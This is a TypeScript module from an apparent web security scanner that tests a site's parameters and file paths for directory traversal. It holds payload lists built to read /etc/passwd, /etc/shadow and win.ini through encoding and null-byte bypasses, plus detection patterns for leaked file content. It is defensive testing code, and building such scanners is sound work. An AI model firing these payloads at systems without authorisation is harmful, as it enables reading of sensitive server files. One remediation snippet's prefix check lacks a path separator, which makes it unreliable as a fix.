import type { ScanModule, Finding } from "../types";
import { scanFetch } from "../fetch";

const TRAVERSAL_PAYLOADS = [
  "../../../etc/passwd",
  "..%2f..%2f..%2fetc%2fpasswd",
  "....//....//....//etc/passwd",
  "..\\..\\..\\etc\\passwd",
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
  "../../../etc/shadow",
  "..%252f..%252f..%252fetc%252fpasswd",
  "../../../windows/win.ini",
  // Unicode/UTF-8 overlong encoding variants
  "..%c0%af..%c0%af..%c0%afetc/passwd",        // UTF-8 overlong /
  "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd", // Fullwidth solidus ／
  "..%c1%9c..%c1%9c..%c1%9cetc/passwd",         // UTF-8 overlong \
  "..%u2216..%u2216..%u2216etc/passwd",          // Unicode set minus ∖
  "..%u2215..%u2215..%u2215etc/passwd",          // Unicode division slash ∕
  // Dot segment variations
  ".%2e/.%2e/.%2e/etc/passwd",
  "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
  "..%00/..%00/..%00/etc/passwd",                // Null byte in path segment
];

const TRAVERSAL_INDICATORS = [
  /root:.*:0:0/,                      // /etc/passwd
  /daemon:.*:\/usr/,                   // /etc/passwd
  /nobody:.*:\/nonexistent/,           // /etc/passwd
  /\[extensions\]/i,                   // win.ini
  /\[fonts\]/i,                        // win.ini
];

const NULL_BYTE_PAYLOADS = [
  "../../../etc/passwd%00.png",
  "../../../etc/passwd%00.jpg",
  "../../../etc/passwd\x00.html",
];

export const pathTraversalModule: ScanModule = async (target) => {
  const findings: Finding[] = [];
  let count = 0;

  // Collect endpoints that might serve files: pages with path params, API endpoints with file-like params
  const testEndpoints: { url: string; paramName: string }[] = [];

  for (const endpoint of target.apiEndpoints) {
    try {
      const url = new URL(endpoint);
      for (const [key] of url.searchParams) {
        if (/file|path|name|doc|page|template|include|dir|folder|src|img|image|download|load|read|view/i.test(key)) {
          testEndpoints.push({ url: endpoint, paramName: key });
        }
      }
    } catch { /* skip */ }
  }

  for (const page of target.pages) {
    try {
      const url = new URL(page);
      for (const [key] of url.searchParams) {
        if (/file|path|name|doc|page|template|include|dir|folder|src|img|image|download|load|read|view/i.test(key)) {
          testEndpoints.push({ url: page, paramName: key });
        }
      }
    } catch { /* skip */ }
  }

  // Also try common file-serving param names on API endpoints
  for (const endpoint of target.apiEndpoints.slice(0, 5)) {
    for (const param of ["file", "path", "filename", "page", "template", "doc", "download"]) {
      testEndpoints.push({ url: endpoint, paramName: param });
    }
  }

  // Deduplicate
  const seen = new Set<string>();
  const deduped = testEndpoints.filter((t) => {
    const key = `${new URL(t.url).pathname}:${t.paramName}`;
    if (seen.has(key)) return false;
    seen.add(key);
    return true;
  });

  // Get baseline — fetch with a normal value to check for false positives
  const baselineTexts = new Map<string, string>();
  await Promise.allSettled(
    deduped.slice(0, 15).map(async (t) => {
      const url = new URL(t.url);
      url.searchParams.set(t.paramName, "normal_file.txt");
      const res = await scanFetch(url.href, { timeoutMs: 5000 });
      const text = await res.text();
      baselineTexts.set(`${new URL(t.url).pathname}:${t.paramName}`, text);
    }),
  );

  const flagged = new Set<string>();

  // Parallelize: test all endpoints with all payloads concurrently
  const allPayloads = [...TRAVERSAL_PAYLOADS, ...NULL_BYTE_PAYLOADS];
  const traversalTests: Promise<void>[] = [];

  for (const t of deduped.slice(0, 15)) {
    const pathname = new URL(t.url).pathname;
    const key = `${pathname}:${t.paramName}`;
    const baseText = baselineTexts.get(key) || "";
    if (TRAVERSAL_INDICATORS.some((p) => p.test(baseText))) continue;

    traversalTests.push(
      (async () => {
        if (flagged.has(key)) return;
        const results = await Promise.allSettled(
          allPayloads.map(async (payload) => {
            const url = new URL(t.url);
            url.searchParams.set(t.paramName, payload);
            const res = await scanFetch(url.href, { timeoutMs: 5000 });
            return { payload, text: await res.text() };
          }),
        );
        for (const r of results) {
          if (r.status !== "fulfilled" || flagged.has(key)) continue;
          const { payload, text } = r.value;
          if (TRAVERSAL_INDICATORS.some((p) => p.test(text))) {
            flagged.add(key);
            const isNullByte = payload.includes("%00") || payload.includes("\x00");
            findings.push({
              id: `path-traversal-${isNullByte ? "null-" : ""}${count++}`,
              module: "Path Traversal",
              severity: "critical",
              title: isNullByte
                ? `Path traversal via null byte on ${pathname}`
                : `Path traversal on ${pathname} (param: ${t.paramName})`,
              description: isNullByte
                ? "A null byte in the file path bypassed extension validation, allowing reading of arbitrary files."
                : "A directory traversal payload returned sensitive system file contents. Attackers can read any file on the server.",
              evidence: `Payload: ${payload}\nParam: ${t.paramName}\nResponse excerpt: ${text.substring(0, 200)}`,
              remediation: "Never use user input directly in file paths. Use path.resolve() and verify the resolved path stays within the intended directory.",
              codeSnippet: isNullByte
                ? `// Strip null bytes and validate the resolved path\nimport path from "node:path";\nconst SAFE_DIR = path.resolve("./uploads");\nconst clean = req.query.file.replace(/\\0/g, "");\nconst resolved = path.resolve(SAFE_DIR, clean);\nif (!resolved.startsWith(SAFE_DIR)) {\n  return res.status(403).json({ error: "Forbidden" });\n}`
                : `// Resolve the path and ensure it stays inside the allowed directory\nimport path from "node:path";\nconst SAFE_DIR = path.resolve("./uploads");\nconst resolved = path.resolve(SAFE_DIR, req.query.file);\nif (!resolved.startsWith(SAFE_DIR + path.sep)) {\n  return res.status(403).json({ error: "Forbidden" });\n}\nconst data = fs.readFileSync(resolved);`,
              cwe: "CWE-22",
              owasp: "A01:2021",
            });
            break;
          }
        }
      })(),
    );
  }

  // URL path segment traversal (parallel)
  const fileEndpoints = target.apiEndpoints.filter((ep) =>
    /file|download|image|asset|static|upload|doc|media/i.test(ep),
  );
  for (const endpoint of fileEndpoints.slice(0, 5)) {
    const url = new URL(endpoint);
    const basePath = url.pathname;
    traversalTests.push(
      (async () => {
        const results = await Promise.allSettled(
          ["../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd"].map(async (traversal) => {
            const testUrl = `${url.origin}${basePath}/${traversal}`;
            const res = await scanFetch(testUrl, { timeoutMs: 5000 });
            return { testUrl, text: await res.text() };
          }),
        );
        for (const r of results) {
          if (r.status !== "fulfilled") continue;
          if (TRAVERSAL_INDICATORS.some((p) => p.test(r.value.text))) {
            findings.push({
              id: `path-traversal-url-${count++}`,
              module: "Path Traversal",
              severity: "critical",
              title: `Path traversal in URL path at ${basePath}`,
              description: "Directory traversal sequences in the URL path returned system file contents.",
              evidence: `URL: ${r.value.testUrl}\nResponse excerpt: ${r.value.text.substring(0, 200)}`,
              remediation: "Validate and sanitize URL path segments. Block traversal sequences in middleware.",
              codeSnippet: `// Middleware: block path traversal sequences in URL segments\nimport { NextResponse } from "next/server";\nexport function middleware(req) {\n  const decoded = decodeURIComponent(req.nextUrl.pathname);\n  if (/\\.\\.[\\/\\\\]/.test(decoded)) {\n    return NextResponse.json({ error: "Invalid path" }, { status: 400 });\n  }\n  return NextResponse.next();\n}\nexport const config = { matcher: "/api/:path*" };`,
              cwe: "CWE-22",
              owasp: "A01:2021",
            });
            break;
          }
        }
      })(),
    );
  }

  await Promise.allSettled(traversalTests);

  return findings;
};
